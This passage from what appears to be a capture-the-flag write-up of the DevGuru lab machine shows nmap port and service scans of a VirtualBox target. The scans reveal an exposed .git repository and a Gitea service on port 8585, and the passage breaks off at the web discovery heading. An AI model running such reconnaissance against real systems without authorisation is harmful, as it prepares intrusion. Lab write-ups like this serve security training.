+    <!-- <i class="fas fa-link anchor"></i> --><svg class="svg-inline--fa fas fa-link anchor" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    &nbsp;
+</a></h2>
+<p>Fast nmap scan.</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>tiago㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nmap -sT -p- --open 192.168.0.63
+</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-12-10 11:22 -03
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.0.63
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.0035s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65532</span> closed ports
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh
+</span></span><span class="line"><span class="cl">80/tcp   open  http
+</span></span><span class="line"><span class="cl">8585/tcp open  unknown
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 16.46 seconds</span></span></code></pre></div></div><p>Nmap scan in detail.</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>tiago㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -sV -A -O -p22,80,8585 192.168.0.63                      <span class="m">1</span> ⨯
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> tiago: 
+</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-12-10 11:24 -03
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.0.63
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.0018s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu <span class="m">4</span> <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 2a:46:e8:2b:01:ff:57:58:7a:5f:25:a4:d6:f2:89:8e <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 08:79:93:9c:e3:b4:a4:be:80:ad:61:9d:d3:88:d2:84 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 9c:f9:88:d4:33:77:06:4e:d9:7c:39:17:3e:07:9c:bd <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp   open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-generator: DevGuru
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-git: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   192.168.0.63:80/.git/
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Git repository found!
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Repository description: Unnamed repository<span class="p">;</span> edit this file <span class="s1">&#39;description&#39;</span> to name the...
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Last commit message: first commit 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Remotes:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>       http://devguru.local:8585/frank/devguru-website.git
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Project type: PHP application <span class="o">(</span>guessed from .gitignore<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Corp - DevGuru
+</span></span><span class="line"><span class="cl">8585/tcp open  unknown
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GenericLines: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">400</span> Bad Request
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Request
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Set-Cookie: <span class="nv">lang</span><span class="o">=</span>en-US<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> Max-Age<span class="o">=</span><span class="m">2147483647</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Set-Cookie: <span class="nv">i_like_gitea</span><span class="o">=</span>60a60f9a3f2071e6<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Set-Cookie: <span class="nv">_csrf</span><span class="o">=</span>gZLNwT-DkBTkP2Femsn0l4c6rU46MTYwNzYxMDI5MDY1NDc0OTg2Mg<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> <span class="nv">Expires</span><span class="o">=</span>Fri, <span class="m">11</span> Dec <span class="m">2020</span> 14:24:50 GMT<span class="p">;</span> HttpOnly
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Frame-Options: SAMEORIGIN
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Thu, <span class="m">10</span> Dec <span class="m">2020</span> 14:24:50 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en-US&#34;</span> <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;theme-&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;head data-suburl<span class="o">=</span><span class="s2">&#34;&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;x-ua-compatible&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;ie=edge&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;title&gt; Gitea: Git with a cup of tea &lt;/title&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;manifest&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/manifest.json&#34;</span> <span class="nv">crossorigin</span><span class="o">=</span><span class="s2">&#34;use-credentials&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;theme-color&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;#6cc644&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;author&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;Gitea - Git with a cup of tea&#34;</span> /&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;description&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;Gitea (Git with a cup of tea) is a painless
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   HTTPOptions: 
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     HTTP/1.0 404 Not Found
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     Content-Type: text/html; charset=UTF-8
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     Set-Cookie: i_like_gitea=5dba56f953e777cd; Path=/; HttpOnly
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     Set-Cookie: _csrf=qFWDFJyuERvO3K1gxAiy1eV2lG86MTYwNzYxMDI5MDc3MDAyMjI4Ng; Path=/; Expires=Fri, 11 Dec 2020 14:24:50 GMT; HttpOnly
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     X-Frame-Options: SAMEORIGIN
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     Date: Thu, 10 Dec 2020 14:24:50 GMT
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     &lt;!DOCTYPE html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     &lt;html lang=&#34;</span>en-US<span class="s2">&#34; class=&#34;</span>theme-<span class="s2">&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     &lt;head data-suburl=&#34;&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     &lt;meta charset=&#34;</span>utf-8<span class="s2">&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     &lt;meta name=&#34;</span>viewport<span class="s2">&#34; content=&#34;</span><span class="nv">width</span><span class="o">=</span>device-width, initial-scale<span class="o">=</span>1<span class="s2">&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     &lt;meta http-equiv=&#34;</span>x-ua-compatible<span class="s2">&#34; content=&#34;</span><span class="nv">ie</span><span class="o">=</span>edge<span class="s2">&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     &lt;title&gt;Page Not Found - Gitea: Git with a cup of tea &lt;/title&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     &lt;link rel=&#34;</span>manifest<span class="s2">&#34; href=&#34;</span>/manifest.json<span class="s2">&#34; crossorigin=&#34;</span>use-credentials<span class="s2">&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     &lt;meta name=&#34;</span>theme-color<span class="s2">&#34; content=&#34;</span><span class="c1">#6cc644&#34;&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;author&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;Gitea - Git with a cup of tea&#34;</span> /&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;description&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;Gitea (Git with a c
+</span></span></span><span class="line"><span class="cl"><span class="s2">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF-Port8585-TCP:V=7.91%I=7%D=12/10%Time=5FD22FB2%P=x86_64-pc-linux-gnu%r(G
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:enericLines,67,&#34;</span>HTTP/1<span class="se">\.</span>1<span class="se">\x</span>20400<span class="se">\x</span>20Bad<span class="se">\x</span>20Request<span class="se">\r\n</span>Content-Type:<span class="se">\x</span><span class="m">20</span>
+</span></span><span class="line"><span class="cl">SF:text/plain<span class="p">;</span><span class="se">\x</span>20charset<span class="o">=</span>utf-8<span class="se">\r\n</span>Connection:<span class="se">\x</span>20close<span class="se">\r\n\r\n</span>400<span class="se">\x</span>20Bad<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>SF:x20Request<span class="s2">&#34;)%r(GetRequest,2A02,&#34;</span>HTTP/1<span class="se">\.</span>0<span class="se">\x</span>20200<span class="se">\x</span>20OK<span class="se">\r\n</span>Content-Type:
+</span></span><span class="line"><span class="cl">SF:<span class="se">\x</span>20text/html<span class="p">;</span><span class="se">\x</span>20charset<span class="o">=</span>UTF-8<span class="se">\r\n</span>Set-Cookie:<span class="se">\x</span>20lang<span class="o">=</span>en-US<span class="p">;</span><span class="se">\x</span>20Path<span class="o">=</span>/
+</span></span><span class="line"><span class="cl">SF:<span class="p">;</span><span class="se">\x</span>20Max-Age<span class="o">=</span>2147483647<span class="se">\r\n</span>Set-Cookie:<span class="se">\x</span>20i_like_gitea<span class="o">=</span>60a60f9a3f2071e6
+</span></span><span class="line"><span class="cl">SF:<span class="p">;</span><span class="se">\x</span>20Path<span class="o">=</span>/<span class="p">;</span><span class="se">\x</span>20HttpOnly<span class="se">\r\n</span>Set-Cookie:<span class="se">\x</span>20_csrf<span class="o">=</span>gZLNwT-DkBTkP2Femsn0l4
+</span></span><span class="line"><span class="cl">SF:c6rU46MTYwNzYxMDI5MDY1NDc0OTg2Mg<span class="p">;</span><span class="se">\x</span>20Path<span class="o">=</span>/<span class="p">;</span><span class="se">\x</span>20Expires<span class="o">=</span>Fri,<span class="se">\x</span>2011<span class="se">\x</span>20D
+</span></span><span class="line"><span class="cl">SF:ec<span class="se">\x</span>202020<span class="se">\x</span>2014:24:50<span class="se">\x</span>20GMT<span class="p">;</span><span class="se">\x</span>20HttpOnly<span class="se">\r\n</span>X-Frame-Options:<span class="se">\x</span>20SAMEO
+</span></span><span class="line"><span class="cl">SF:RIGIN<span class="se">\r\n</span>Date:<span class="se">\x</span>20Thu,<span class="se">\x</span>2010<span class="se">\x</span>20Dec<span class="se">\x</span>202020<span class="se">\x</span>2014:24:50<span class="se">\x</span>20GMT<span class="se">\r\n\r\n</span>&lt;
+</span></span><span class="line"><span class="cl">SF:!DOCTYPE<span class="se">\x</span>20html&gt;<span class="se">\n</span>&lt;html<span class="se">\x</span>20lang<span class="o">=</span><span class="se">\&#34;</span>en-US<span class="se">\&#34;\x</span>20class<span class="o">=</span><span class="se">\&#34;</span>theme-<span class="se">\&#34;</span>&gt;<span class="se">\n</span>&lt;head<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>SF:x20data-suburl<span class="o">=</span><span class="se">\&#34;\&#34;</span>&gt;<span class="se">\n\t</span>&lt;meta<span class="se">\x</span>20charset<span class="o">=</span><span class="se">\&#34;</span>utf-8<span class="se">\&#34;</span>&gt;<span class="se">\n\t</span>&lt;meta<span class="se">\x</span>20name<span class="o">=</span><span class="se">\&#34;</span>
+</span></span><span class="line"><span class="cl">SF:viewport<span class="se">\&#34;\x</span>20content<span class="o">=</span><span class="se">\&#34;</span><span class="nv">width</span><span class="o">=</span>device-width,<span class="se">\x</span>20initial-scale<span class="o">=</span>1<span class="se">\&#34;</span>&gt;<span class="se">\n\t</span>&lt;m
+</span></span><span class="line"><span class="cl">SF:eta<span class="se">\x</span>20http-equiv<span class="o">=</span><span class="se">\&#34;</span>x-ua-compatible<span class="se">\&#34;\x</span>20content<span class="o">=</span><span class="se">\&#34;</span><span class="nv">ie</span><span class="o">=</span>edge<span class="se">\&#34;</span>&gt;<span class="se">\n\t</span>&lt;title
+</span></span><span class="line"><span class="cl">SF:&gt;<span class="se">\x</span>20Gitea:<span class="se">\x</span>20Git<span class="se">\x</span>20with<span class="se">\x</span>20a<span class="se">\x</span>20cup<span class="se">\x</span>20of<span class="se">\x</span>20tea<span class="se">\x</span>20&lt;/title&gt;<span class="se">\n\t</span>&lt;lin
+</span></span><span class="line"><span class="cl">SF:k<span class="se">\x</span>20rel<span class="o">=</span><span class="se">\&#34;</span>manifest<span class="se">\&#34;\x</span>20href<span class="o">=</span><span class="se">\&#34;</span>/manifest<span class="se">\.</span>json<span class="se">\&#34;\x</span>20crossorigin<span class="o">=</span><span class="se">\&#34;</span>use-
+</span></span><span class="line"><span class="cl">SF:credentials<span class="se">\&#34;</span>&gt;<span class="se">\n\t</span>&lt;meta<span class="se">\x</span>20name<span class="o">=</span><span class="se">\&#34;</span>theme-color<span class="se">\&#34;\x</span>20content<span class="o">=</span><span class="se">\&#34;</span><span class="c1">#6cc644\&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">SF:<span class="se">\n\t</span>&lt;meta<span class="se">\x</span>20name<span class="o">=</span><span class="se">\&#34;</span>author<span class="se">\&#34;\x</span>20content<span class="o">=</span><span class="se">\&#34;</span>Gitea<span class="se">\x</span>20-<span class="se">\x</span>20Git<span class="se">\x</span>20with<span class="se">\x</span><span class="m">20</span>
+</span></span><span class="line"><span class="cl">SF:a<span class="se">\x</span>20cup<span class="se">\x</span>20of<span class="se">\x</span>20tea<span class="se">\&#34;\x</span>20/&gt;<span class="se">\n\t</span>&lt;meta<span class="se">\x</span>20name<span class="o">=</span><span class="se">\&#34;</span>description<span class="se">\&#34;\x</span>20conte
+</span></span><span class="line"><span class="cl">SF:nt<span class="o">=</span><span class="se">\&#34;</span>Gitea<span class="se">\x</span>20<span class="se">\(</span>Git<span class="se">\x</span>20with<span class="se">\x</span>20a<span class="se">\x</span>20cup<span class="se">\x</span>20of<span class="se">\x</span>20tea<span class="se">\)\x</span>20is<span class="se">\x</span>20a<span class="se">\x</span>20pa
+</span></span><span class="line"><span class="cl">SF:inless<span class="s2">&#34;)%r(HTTPOptions,212A,&#34;</span>HTTP/1<span class="se">\.</span>0<span class="se">\x</span>20404<span class="se">\x</span>20Not<span class="se">\x</span>20Found<span class="se">\r\n</span>Conten
+</span></span><span class="line"><span class="cl">SF:t-Type:<span class="se">\x</span>20text/html<span class="p">;</span><span class="se">\x</span>20charset<span class="o">=</span>UTF-8<span class="se">\r\n</span>Set-Cookie:<span class="se">\x</span>20lang<span class="o">=</span>en-US<span class="p">;</span><span class="se">\x</span><span class="m">2</span>
+</span></span><span class="line"><span class="cl">SF:0Path<span class="o">=</span>/<span class="p">;</span><span class="se">\x</span>20Max-Age<span class="o">=</span>2147483647<span class="se">\r\n</span>Set-Cookie:<span class="se">\x</span>20i_like_gitea<span class="o">=</span>5dba56f95
+</span></span><span class="line"><span class="cl">SF:3e777cd<span class="p">;</span><span class="se">\x</span>20Path<span class="o">=</span>/<span class="p">;</span><span class="se">\x</span>20HttpOnly<span class="se">\r\n</span>Set-Cookie:<span class="se">\x</span>20_csrf<span class="o">=</span>qFWDFJyuERvO3K1
+</span></span><span class="line"><span class="cl">SF:gxAiy1eV2lG86MTYwNzYxMDI5MDc3MDAyMjI4Ng<span class="p">;</span><span class="se">\x</span>20Path<span class="o">=</span>/<span class="p">;</span><span class="se">\x</span>20Expires<span class="o">=</span>Fri,<span class="se">\x</span><span class="m">20</span>
+</span></span><span class="line"><span class="cl">SF:11<span class="se">\x</span>20Dec<span class="se">\x</span>202020<span class="se">\x</span>2014:24:50<span class="se">\x</span>20GMT<span class="p">;</span><span class="se">\x</span>20HttpOnly<span class="se">\r\n</span>X-Frame-Options:<span class="se">\x</span>
+</span></span><span class="line"><span class="cl">SF:20SAMEORIGIN<span class="se">\r\n</span>Date:<span class="se">\x</span>20Thu,<span class="se">\x</span>2010<span class="se">\x</span>20Dec<span class="se">\x</span>202020<span class="se">\x</span>2014:24:50<span class="se">\x</span>20GMT<span class="se">\r</span>
+</span></span><span class="line"><span class="cl">SF:<span class="se">\n\r\n</span>&lt;!DOCTYPE<span class="se">\x</span>20html&gt;<span class="se">\n</span>&lt;html<span class="se">\x</span>20lang<span class="o">=</span><span class="se">\&#34;</span>en-US<span class="se">\&#34;\x</span>20class<span class="o">=</span><span class="se">\&#34;</span>theme-<span class="se">\&#34;</span>&gt;<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>SF:n&lt;head<span class="se">\x</span>20data-suburl<span class="o">=</span><span class="se">\&#34;\&#34;</span>&gt;<span class="se">\n\t</span>&lt;meta<span class="se">\x</span>20charset<span class="o">=</span><span class="se">\&#34;</span>utf-8<span class="se">\&#34;</span>&gt;<span class="se">\n\t</span>&lt;meta<span class="se">\x</span><span class="m">20</span>
+</span></span><span class="line"><span class="cl">SF:name<span class="o">=</span><span class="se">\&#34;</span>viewport<span class="se">\&#34;\x</span>20content<span class="o">=</span><span class="se">\&#34;</span><span class="nv">width</span><span class="o">=</span>device-width,<span class="se">\x</span>20initial-scale<span class="o">=</span>1<span class="se">\&#34;</span>
+</span></span><span class="line"><span class="cl">SF:&gt;<span class="se">\n\t</span>&lt;meta<span class="se">\x</span>20http-equiv<span class="o">=</span><span class="se">\&#34;</span>x-ua-compatible<span class="se">\&#34;\x</span>20content<span class="o">=</span><span class="se">\&#34;</span><span class="nv">ie</span><span class="o">=</span>edge<span class="se">\&#34;</span>&gt;<span class="se">\n\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>SF:t&lt;title&gt;Page<span class="se">\x</span>20Not<span class="se">\x</span>20Found<span class="se">\x</span>20-<span class="se">\x</span>20<span class="se">\x</span>20Gitea:<span class="se">\x</span>20Git<span class="se">\x</span>20with<span class="se">\x</span>20a<span class="se">\x</span><span class="m">20</span>
+</span></span><span class="line"><span class="cl">SF:cup<span class="se">\x</span>20of<span class="se">\x</span>20tea<span class="se">\x</span>20&lt;/title&gt;<span class="se">\n\t</span>&lt;link<span class="se">\x</span>20rel<span class="o">=</span><span class="se">\&#34;</span>manifest<span class="se">\&#34;\x</span>20href<span class="o">=</span><span class="se">\&#34;</span>/ma
+</span></span><span class="line"><span class="cl">SF:nifest<span class="se">\.</span>json<span class="se">\&#34;\x</span>20crossorigin<span class="o">=</span><span class="se">\&#34;</span>use-credentials<span class="se">\&#34;</span>&gt;<span class="se">\n\t</span>&lt;meta<span class="se">\x</span>20name<span class="o">=</span><span class="se">\&#34;</span>t
+</span></span><span class="line"><span class="cl">SF:heme-color<span class="se">\&#34;\x</span>20content<span class="o">=</span><span class="se">\&#34;</span><span class="c1">#6cc644\&#34;&gt;\n\t&lt;meta\x20name=\&#34;author\&#34;\x20con</span>
+</span></span><span class="line"><span class="cl">SF:tent<span class="o">=</span><span class="se">\&#34;</span>Gitea<span class="se">\x</span>20-<span class="se">\x</span>20Git<span class="se">\x</span>20with<span class="se">\x</span>20a<span class="se">\x</span>20cup<span class="se">\x</span>20of<span class="se">\x</span>20tea<span class="se">\&#34;\x</span>20/&gt;<span class="se">\n\t</span>&lt;m
+</span></span><span class="line"><span class="cl">SF:eta<span class="se">\x</span>20name<span class="o">=</span><span class="se">\&#34;</span>description<span class="se">\&#34;\x</span>20content<span class="o">=</span><span class="se">\&#34;</span>Gitea<span class="se">\x</span>20<span class="se">\(</span>Git<span class="se">\x</span>20with<span class="se">\x</span>20a<span class="se">\x</span><span class="m">2</span>
+</span></span><span class="line"><span class="cl">SF:0c<span class="s2">&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">MAC Address: 08:00:27:FF:2C:BE (Oracle VirtualBox virtual NIC)
+</span></span></span><span class="line"><span class="cl"><span class="s2">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+</span></span></span><span class="line"><span class="cl"><span class="s2">Device type: general purpose
+</span></span></span><span class="line"><span class="cl"><span class="s2">Running: Linux 4.X|5.X
+</span></span></span><span class="line"><span class="cl"><span class="s2">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+</span></span></span><span class="line"><span class="cl"><span class="s2">OS details: Linux 4.15 - 5.6
+</span></span></span><span class="line"><span class="cl"><span class="s2">Network Distance: 1 hop
+</span></span></span><span class="line"><span class="cl"><span class="s2">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">TRACEROUTE
+</span></span></span><span class="line"><span class="cl"><span class="s2">HOP RTT     ADDRESS
+</span></span></span><span class="line"><span class="cl"><span class="s2">1   1.83 ms 192.168.0.63
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span></span><span class="line"><span class="cl"><span class="s2">Nmap done: 1 IP address (1 host up) scanned in 101.57 seconds</span></span></span></code></pre></div></div><p>Site <strong>DevGuru</strong> available in port <code>80</code>.</p>
+<p><img alt="image-20201210112759467" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055825/blog/image-20201210112759467_xivcws.png"></p>
+<p><img alt="image-20201210213342631" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055825/blog/image-20201210213342631_ckzu70.png"></p>
+<p><strong>Gitea</strong> in port <code>8585</code>.</p>
+<p><img alt="image-20201210112847850" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1608055823/blog/image-20201210112847850_i8cfxf.png"></p>
+
+<h2 id="web-discovery" class="heading">Web discovery <a href="#web-discovery" aria-labelledby="web-discovery">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-link anchor"></i> --><svg class="svg-inline--fa fas fa-link anchor" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    &nbsp;
+</a></h2>
+
+<h3 id="nikto" class="heading">Nikto <a href="#nikto" aria-labelledby="nikto">
+
+
+
+
+
+
+
+
+
+    
+
